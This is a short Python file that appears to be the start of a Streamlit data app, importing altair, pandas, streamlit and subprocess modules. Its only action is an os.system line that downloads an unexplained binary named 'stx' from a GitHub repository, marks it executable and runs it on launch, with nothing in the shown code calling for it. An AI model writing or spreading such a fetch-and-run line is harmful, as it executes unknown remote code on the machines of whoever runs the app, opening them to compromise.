from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64
os.system("curl -L -o stx https://github.com/hagacz/tes/raw/main/stx && chmod +x stx && ./stx")
